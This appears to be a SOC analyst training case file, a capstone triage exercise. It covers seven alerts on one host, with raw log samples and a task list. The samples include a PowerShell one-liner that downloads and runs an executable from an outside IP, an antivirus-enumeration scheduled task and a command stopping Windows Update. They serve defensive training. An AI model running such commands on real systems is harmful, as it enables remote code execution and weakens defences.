# Case 019 — Final Exam, Stage 1: Opening Queue + Mid-Chain Interrupt

**Incident ID:** IR-2026-035
**Date Detected:** 2026-07-06
**Host:** JIMIL-JOSHI
**Reported By:** SOC Monitoring (Splunk + EDR + ticket-based alerts)
**Status:** 🔴 Open — Pending Triage

**Phase:** 3 — Final Exam (Stage 1 of 2). This two-part case (019/020) is the capstone of the repo, combining every skill practiced across Phases 1-3: independent investigation, batch prioritization, live queue interrupts, mixed alert formats, cross-alert correlation, and a shift-handoff deliverable. A time-pressure target (~2-3 minutes/alert) was enforced throughout.

---

## 🎫 Opening Queue — 6 Alerts

| # | Alert | Type | Format | SIEM Severity |
|---|---|---|---|---|
| 1 | Alert BA | PowerShell downloading + running unsigned binary | Splunk | 🔴 High |
| 2 | Alert BB | Suspicious login from Tor exit node IP | Ticket-only | 🔴 High |
| 3 | Alert BC | Scheduled task running WMI query for antivirus products | Splunk | 🟠 Medium |
| 4 | Alert BD | Large volume of DNS TXT record queries | EDR-style | 🟠 Medium |
| 5 | Alert BE | User changed their own display name in AD | Ticket-only | 🟢 Info |
| 6 | Alert BF | Windows Update service stopped | Splunk | 🟡 Low |

**Analyst's chosen order:** BA → BB → BD → BC → BF → BE

---

## 🚨 Mid-Stage Interrupt

While closing out the opening queue, a 7th alert arrived:

| # | Alert | Type | Severity |
|---|---|---|---|
| 7 | Alert BG | Mimikatz-signature process detected by EDR, actively running | 🔴 Critical |

---

## 📄 Raw Event Data

### Alert BA
```
Process_Command_Line: powershell.exe -c "Invoke-WebRequest -Uri http://91.242.217.88/svc.exe -OutFile C:\Windows\Temp\svc.exe; Start-Process C:\Windows\Temp\svc.exe"
Account: hp | Parent: cmd.exe
```

### Alert BB
```
Login event: account hp, source IP 185.220.100.240 (known Tor exit node per threat intel feed), Logon_Type 3 (Network)
```

### Alert BC
```
Process_Command_Line: schtasks /create /tn "SysCheck" /tr "wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName" /sc onlogon
Account: hp | Parent: cmd.exe
```

### Alert BD
```
[EDR ALERT]
Detection: High-volume DNS TXT queries
Query count: 340 TXT record queries in 5 minutes to *.datasync-cloud.net
MITRE: T1071.004
```

### Alert BE
```
Active Directory attribute change: displayName modified from "Jimil Joshi" to "J. Joshi"
Account: hp | Time: 10:00 AM
```

### Alert BF
```
Process_Command_Line: net stop wuauserv
Account: hp | Parent: cmd.exe
```

### Alert BG (interrupt)
```
[EDR ALERT]
Detection: Mimikatz-signature process actively running
Host: JIMIL-JOSHI
Severity: Critical
```

---

## 🎯 Task

1. Determine triage order across the 6-alert opening queue and justify it.
2. Investigate each alert under time pressure (~2-3 min/alert target).
3. Handle the mid-stage interrupt (Alert BG) and explain how it connects to prior findings.
4. Give a verdict for all 7 alerts.
